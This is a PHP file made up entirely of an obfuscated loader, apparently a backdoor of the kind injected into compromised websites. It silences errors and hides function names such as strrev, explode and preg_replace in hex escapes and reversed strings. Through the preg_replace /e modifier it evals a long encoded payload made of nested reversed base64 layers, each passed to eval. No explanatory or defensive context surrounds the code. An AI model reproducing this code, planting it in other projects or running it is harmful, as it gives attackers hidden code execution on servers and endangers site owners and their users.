<?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "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pO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>